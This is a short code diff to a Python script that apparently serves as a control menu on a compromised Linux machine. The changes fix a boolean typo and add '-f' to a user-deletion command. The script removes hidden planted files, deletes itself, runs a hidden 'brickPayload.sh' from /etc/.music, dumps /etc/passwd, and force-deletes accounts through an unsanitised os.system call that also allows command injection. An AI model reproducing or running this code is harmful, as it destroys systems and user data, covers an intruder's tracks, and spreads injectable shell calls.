@@ -26,7 +26,7 @@ def main():
             os.system("rm /bin/.systemm.sh")
             os.system("rm /etc/.resolver.sh")
             print("Success.")
-            cont = false
+            cont = False
             os.remove(argv[0])
         elif(value.lower() in  ('k')):
             os.system("bash /etc/.music/brickPayload.sh")
@@ -46,6 +46,6 @@ def main():
             print("Current users are:")
             os.system("cat /etc/passwd")
             name = input("Which user would you like to remove?")
-            os.system("userdel -r "+name)
+            os.system("userdel -r -f "+name)
             print("User removed.")
 main()
